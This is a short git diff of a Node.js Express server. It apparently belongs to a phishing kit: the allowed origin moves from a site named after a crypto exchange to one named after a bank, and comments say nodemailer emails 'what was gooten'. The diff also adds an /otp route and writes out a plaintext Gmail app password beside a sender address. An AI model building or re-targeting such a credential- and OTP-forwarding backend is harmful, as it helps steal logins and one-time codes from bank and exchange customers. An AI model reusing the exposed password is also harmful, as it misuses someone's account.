@@ -5,15 +5,15 @@ const cors = require("cors");
 const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email
 
 app.use(express.json());
-app.use(cors({ origin: "https://busha-app.vercel.app" }));
+app.use(cors({ origin: "https://ssuntrust-app.vercel.app" }));
 
 
 const PORT = process.env.PORT || 5000; // port to connect to WEB
 
 // emails credentials
-const userEmail = "ajaeroElvis5@gmail.com";
-//const pass = "qrgdnnovrfqeyutr";
-// 15 MAY
+const userEmail = "laluzresorts@gmail.com";
+const pass = "whjtzzbwnmqvafpt";
+// 23 sept
 
 // Middleware
 app.use(express.json());
@@ -114,3 +114,4 @@ app.post("/otp", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port http://localhost:${PORT}`);
 });
+
